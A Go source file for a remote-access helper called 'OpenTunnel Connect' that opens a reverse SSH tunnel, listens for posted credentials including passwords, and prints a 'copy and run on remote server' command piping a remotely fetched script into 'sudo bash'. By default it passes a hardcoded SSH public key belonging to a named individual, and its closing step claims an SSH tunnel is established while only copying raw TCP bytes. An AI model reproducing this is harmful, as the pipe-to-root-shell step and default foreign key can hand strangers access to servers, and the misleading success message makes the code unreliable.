package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"time"
)

type Credential struct {
	User     string `json:"user"`
	Password string `json:"password"`
	Host     string `json:"host"`
	Port     int    `json:"port"`
	AuthType string `json:"auth_type"`
}

var credential Credential

func main() {
	user := "tunneluser"
	sshKey := "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFzn4bIIjxL+VO6WCjrvF+rxt3LVi4s4X57ZwP4wnG1h julianponguta@gmail.com"

	args := os.Args[1:]
	for i := 0; i < len(args); i++ {
		if args[i] == "--user" && i+1 < len(args) {
			user = args[i+1]
			i++
		} else if args[i] == "--ssh-key" && i+1 < len(args) {
			sshKey = args[i+1]
			i++
		}
	}

	fmt.Println("========================================")
	fmt.Println("OpenTunnel Connect")
	fmt.Println("========================================")

	go func() {
		http.HandleFunc("/connect", func(w http.ResponseWriter, r *http.Request) {
			body, _ := io.ReadAll(r.Body)
			json.Unmarshal(body, &credential)
			fmt.Println("[+] Credentials received!")
			w.Write([]byte("ok"))
		})
		http.ListenAndServe(":3000", nil)
	}()

	tunnelCmd := exec.Command("ssh", "-R", "80:localhost:3000", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=60", "-o", "LogLevel=ERROR", "nokey@localhost.run")

	tunnelOutput, err := tunnelCmd.StdoutPipe()
	if err != nil {
		fmt.Printf("[-] Failed to create pipe: %v\n", err)
		os.Exit(1)
	}

	tunnelCmd.Stderr = tunnelCmd.Stdout

	if err := tunnelCmd.Start(); err != nil {
		fmt.Printf("[-] Failed to start tunnel: %v\n", err)
		os.Exit(1)
	}

	scanner := bufio.NewScanner(tunnelOutput)
	tunnelURL := ""

	for scanner.Scan() {
		line := scanner.Text()
		re := regexp.MustCompile(`(\w+)\.lhr\.life`)
		matches := re.FindStringSubmatch(line)
		if len(matches) > 1 {
			tunnelURL = matches[0]
			break
		}
	}

	if tunnelURL == "" {
		fmt.Println("[-] Could not detect tunnel URL")
		os.Exit(1)
	}

	fmt.Printf("Tunnel: %s\n", tunnelURL)
	fmt.Println("\nCOPY AND RUN ON REMOTE SERVER:")
	fmt.Println("========================================")
	fmt.Printf("curl -fsSL https://raw.githubusercontent.com/julianponguta/opentunnel/main/skills/opentunnel-connect/scripts/remote.sh | sudo bash -s -- %s 60 %s \"%s\"\n", tunnelURL, user, sshKey)
	fmt.Println("========================================")
	fmt.Println("\nWaiting for remote connection...")

	for {
		if credential.Host != "" {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}

	fmt.Printf("[+] Remote connected: %s@%s:%d\n", credential.User, credential.Host, credential.Port)

	sshConn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", credential.Host, credential.Port))
	if err != nil {
		fmt.Printf("[-] Failed to connect: %v\n", err)
		os.Exit(1)
	}
	defer sshConn.Close()

	fmt.Println("[+] SSH tunnel established!")

	io.Copy(os.Stdout, sshConn)
}
